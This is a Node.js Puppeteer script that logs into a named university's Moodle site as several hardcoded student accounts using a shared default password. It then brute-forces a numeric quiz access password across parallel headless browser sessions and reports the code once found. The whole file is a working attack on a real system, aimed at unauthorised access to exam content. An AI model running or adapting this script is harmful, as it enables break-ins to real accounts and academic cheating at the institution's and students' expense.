const timeout = millis => new Promise(resolve => setTimeout(resolve, millis));
var Found = false;

(function() {
    var savedConsole = console;
    console = {};
    console.log = function(message) {
        if (!message.includes('waitFor') && !Found) {
            savedConsole.log(message);
        }
    };
    console.warn = function(message) {
        if (!message.includes('waitFor')) { savedConsole.warn(message); }
    };
    console.error = function(message) {
        if (!message.includes('waitFor')) {
            savedConsole.error(message);
        }
    };
})();






var Users = ["cbg3s541", "cbg3s538", "cbg3s537", "cbg3s534", "cbg3s533", "cbg3s532", "cbg3s531", "cbg3s530", "cbg3s525", "cbg3s521", "cbg3s516", "cbg3s508", "cbg3s507", "cbg3s506", "cbg3s505"];
var UsedUser = [""];
var Done = 0;

var MStart = 1950;
var MEnd = 2800;
var Max = 10;
var Step = parseInt((MEnd - MStart) / Max);
for (let O = 0; O < Max; O++) {

    var User = "";
    while (UsedUser.includes(User)) {
        User = Users[Math.floor(Math.random() * Users.length)];
    }
    UsedUser.push(User);


    if (O == 0) {
        try {
            GO_Hack(User, 0 + MStart, Step + MStart);
        } catch (e) { //
        }
    } else {
        try {
            var mStart = 1 + (Step * O) + MStart;
            var mEnd = (Step * O) + Step + MStart;
            GO_Hack(User, mStart, mEnd);
        } catch (e) { //
        }
    }
} //




async function GO_Hack(UserName, Start, End) {

    const puppeteer = require('puppeteer');
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();
    page.setDefaultNavigationTimeout(0);



    page.goto("http://e-learningcenter3.tanta.edu.eg/med-moodle/login/index.php");
    await page.waitForSelector('#loginbtn', { timeout: 0 });
    await page.$eval('#username', (el, UserName) => el.value = UserName, UserName);
    await page.$eval('#password', el => el.value = "Covid@19");


    await page.$eval('#loginbtn', el => { el.click(); });


    await timeout(2000);

    page.goto("http://e-learningcenter3.tanta.edu.eg/med-moodle/mod/quiz/view.php?id=12183");

    await page.waitForSelector("#region-main > div > div > div.box.quizattempt.p-y-1 > div > form", { timeout: 0 });


    await page.$eval("#region-main > div > div > div.box.quizattempt.p-y-1 > div > form", el => { el.submit(); });

    await page.waitForSelector("#id_submitbutton", { timeout: 0 });

    await page.$eval("input#id_quizpassword", el => el.value = '000000');
    await page.$eval("#id_submitbutton", el => { el.click(); });


    for (let X = Start; X < End; X++) {
        try {
            await page.waitForSelector("input#id_quizpassword", { timeout: 0 });
            await page.$eval("input#id_quizpassword", el => el.value = ''); //Clear Fieled
            await page.$eval("input#id_quizpassword", (el, X) => el.value = X, X.toString()); //Type Password
            await page.keyboard.press('Enter'); //Enter
            //await timeout(1000);
            Done++;
            console.log(`Trying : ${X.toString()} , Remaing : ${(MEnd - MStart) - Done} , Persent : ${(Done *100)/ (MEnd - MStart)}%`);


        } catch (e) {
            X--;
        }
        var U = await page.url();
        if (!U.toString().includes("startattempt.php")) {
            if (!U.toString().includes("index.php")) {
                console.log(`-------------------------- Found : ${X.toString()} -------------------------- at User:${UserName.toString()}`);
                Found = true;
                browser.close();
            } else {
                console.warn(`----------------------- Breaked at  : ${X.toString()} and End is: ${End.toString()} -------------------------- at User:${UserName.toString()}`);
                break;
            }
            break;
        }
    }
    console.log(`User:${UserName.toString()} Done From ${Start} to ${End}`);
    if ((MEnd - MStart) - Done == 0) {
        console.log("All Is Done");
    }
    browser.close();
};